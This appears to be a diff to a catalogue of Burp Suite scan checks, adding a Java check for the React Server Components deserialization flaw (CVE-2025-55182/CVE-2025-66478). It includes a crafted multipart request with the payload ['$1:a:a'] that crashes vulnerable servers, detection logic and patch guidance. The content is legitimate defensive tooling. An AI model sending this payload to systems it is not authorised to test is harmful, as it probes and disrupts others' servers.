@@ -54,6 +54,109 @@ for (var origin : new String[]{evilHttps, evilHttp})
 return AuditResult.auditResult();
 
 ```
+## [CVE-2025-55182CVE-2025-66478-React2Shell.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomScanChecks/CVE-2025-55182CVE-2025-66478-React2Shell.bambda)
+### Active scan check for CVE-2025-55182 (React) and CVE-2025-66478 (Next.js).  The vulnerability exploits insecure deserialization in the RSC Flight protocol where unvalidated colon-delimited property references cause server crashes that can lead to RCE (CVSS 10.0).
+#### Author: Dave Paterson, PortSwigger
+```java
+
+String boundary = "----WebKitFormBoundary" + UUID.randomUUID().toString().replace("-", "").substring(0, 16);
+
+String payload = "--" + boundary + "\r\n" +
+                 "Content-Disposition: form-data; name=\"1\"\r\n\r\n" +
+                 "{}\r\n" +
+                 "--" + boundary + "\r\n" +
+                 "Content-Disposition: form-data; name=\"0\"\r\n\r\n" +
+                 "[\"$1:a:a\"]\r\n" +
+                 "--" + boundary + "--\r\n";
+
+String request =
+        """
+        POST / HTTP/1.1\r
+        Host: %s\r
+        Content-Type: multipart/form-data; boundary=%s\r
+        Next-Action: %s\r
+        X-Nextjs-Request-Id: %s\r
+        Next-Router-State-Tree: [[["",{"children":["__PAGE__",{}]},null,null,true]]\r
+        \r
+        """.formatted(
+                requestResponse.request().httpService().host(),
+                boundary,
+                UUID.randomUUID().toString().replace("-", ""),
+                UUID.randomUUID().toString()
+        );
+HttpRequestResponse exploitResponse = http.sendRequest(HttpRequest.httpRequest(requestResponse.httpService(), request).withBody(payload));
+
+if (exploitResponse != null
+    && exploitResponse.hasResponse()
+    && exploitResponse.response().statusCode() == 500
+)
+{
+    String body = exploitResponse.response().bodyToString();
+    if (body == null)
+    {
+        return AuditResult.auditResult();
+    }
+
+    if (body.contains("E{\"digest\"") ||
+        (body.contains("digest") && body.contains("Error")))
+    {
+        AuditIssue auditIssue = AuditIssue.auditIssue(
+                "CVE-2025-55182 / CVE-2025-66478 React Server Components Remote Code Execution",
+                """
+                        <p>The application is vulnerable to <b>CVE-2025-55182</b> (React) and <b>CVE-2025-66478</b> (Next.js), \
+                        critical Remote Code Execution vulnerabilities in React Server Components with CVSS score of 10.0.</p>\
+                        <p><b>Vulnerability Overview:</b></p>\
+                        <ul>\
+                        <li>Unauthenticated Remote Code Execution via insecure deserialization</li>\
+                        <li>The RSC Flight protocol fails to validate property existence in colon-delimited references</li>\
+                        <li>Malformed multipart form-data triggers unhandled exceptions leading to RCE</li>\
+                        <li>No prerequisites or special configuration required for exploitation</li>\
+                        </ul>\
+                        <p><b>Detection Evidence:</b></p>\
+                        <ul>\
+                        <li>✓ HTTP 500 status code received</li>\
+                        <li>✓ Next.js error digest pattern detected in response</li>\
+                        <li>✓ Server failed to handle malicious property reference: <code>["$1:a:a"]</code></li>\
+                        </ul>\
+                        """,
+                """
+                        <p><b>CRITICAL - Immediate Action Required</b></p>\
+                        <p>This vulnerability allows unauthenticated attackers to execute arbitrary code on the server. \
+                        Patch immediately.</p>\
+                        <p><b>Upgrade to Patched Versions:</b></p>\
+                        <ul>\
+                        <li><b>React:</b> 19.0.1, 19.1.2, or 19.2.1</li>\
+                        <li><b>Next.js:</b> 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, or 16.0.7</li>\
+                        </ul>\
+                        <p><b>Remediation Steps:</b></p>\
+                        <ol>\
+                        <li>Update package.json dependencies to patched versions</li>\
+                        <li>Run: <code>npm install</code> or <code>npm update</code></li>\
+                        <li>Rebuild and redeploy application</li>\
+                        <li>Verify fix by re-scanning</li>\
+                        </ol>\
+                        <p><b>References:</b></p>\
+                        <ul>\
+                        <li><a href="https://nextjs.org/blog/CVE-2025-66478">Next.js Security Advisory</a></li>\
+                        <li><a href="https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182">CVE-2025-55182 Details</a></li>\
+                        <li><a href="https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478/">Detection of CVE-2025-55182</li>\
+                        </ul>""",
+                requestResponse.request().url(),
+                AuditIssueSeverity.HIGH,
+                AuditIssueConfidence.CERTAIN,
+                null,
+                null,
+                AuditIssueSeverity.HIGH,
+                exploitResponse
+        );
+        return AuditResult.auditResult(List.of(auditIssue));
+    }
+}
+
+
+return AuditResult.auditResult();
+
+```
 ## [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomScanChecks/CookiePrefixBypass.bambda)
 ### Identifies HTTP cookie prefix bypass vulnerability.
 #### Author: d0ge
